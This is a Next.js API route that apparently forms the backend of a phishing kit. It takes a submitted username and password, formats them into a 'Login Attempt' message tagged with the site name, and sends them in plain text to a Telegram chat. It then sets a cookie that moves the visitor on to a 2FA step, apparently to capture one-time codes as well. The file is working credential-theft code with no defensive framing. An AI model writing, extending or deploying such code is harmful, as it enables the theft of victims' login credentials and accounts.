import { NextResponse } from 'next/server';
import { sendTelegramMessage, getSiteName } from '@/lib/telegram';

function escapeHtml(s) {
  if (typeof s !== 'string') return '';
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export async function POST(request) {
  try {
    const body = await request.json().catch(() => ({}));
    const username = escapeHtml(String(body.username ?? '').trim()) || '—';
    const password = escapeHtml(String(body.password ?? '').trim()) || '—';

    const message = [
      `🏷 Site: ${escapeHtml(getSiteName())}`,
      '',
      '🔐 <b>Login Attempt</b>',
      '━━━━━━━━━━━━━━━━━━',
      `👤 Username: ${username}`,
      `🔒 Password: ${password}`,
    ].join('\n');

    await sendTelegramMessage(message);
    const res = NextResponse.json({ ok: true });
    res.cookies.set('flow', '2fa', { path: '/', maxAge: 600, httpOnly: true, sameSite: 'lax' });
    return res;
  } catch (err) {
    console.error('notify-login:', err);
    return NextResponse.json({ error: 'Notification failed' }, { status: 503 });
  }
}
